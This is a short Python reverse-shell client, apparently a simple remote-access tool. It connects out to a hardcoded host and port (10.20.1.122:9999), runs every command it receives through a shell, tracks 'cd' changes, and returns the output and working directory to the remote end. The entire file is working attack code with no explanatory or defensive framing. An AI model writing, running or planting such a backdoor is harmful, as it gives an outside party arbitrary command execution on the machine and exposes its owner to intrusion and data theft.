# -*- coding: utf-8 -*-
import os
import socket
import subprocess

s = socket.socket()
host = '10.20.1.122'
port = 9999
s.connect((host, port))


while True:
    data = s.recv(1024)
    print(data)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes.strip(), "utf-8", errors="ignore") #windows
        s.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> " ))
        print(output_str)

# Cerrando la conexión
s.close()
